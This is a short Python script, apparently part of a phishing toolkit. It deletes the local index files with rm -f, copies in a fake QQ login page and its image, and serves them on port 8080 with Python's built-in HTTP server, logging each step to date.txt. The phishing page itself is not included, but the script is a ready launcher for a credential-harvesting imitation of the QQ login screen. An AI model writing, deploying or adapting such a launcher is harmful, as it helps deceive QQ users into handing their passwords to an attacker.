#qq logon page write
print("")
print("")
print("finish the file: qqlogon.py")
print("finish the file: set.py")
print("finish the file: setoollin.py")
print("loading...")
    #to find the file path yes or no true
    #start to write the cantent to the file
with open("../date.txt","a") as f:
    f.write("start qqlogon")
f.close()


import os
#start port 8080
os.system("rm -f index.html")
os.system("rm -f index.js")
os.system("cp qq/index.html ./")
os.system("cp qq/index.js ./")
os.system("cp qq/qqlogon.jpg ./")
os.system("python3 -m http.server 8080")

 
with open("date.txt","a") as f:
    f.write("start the port 8080")
f.close()



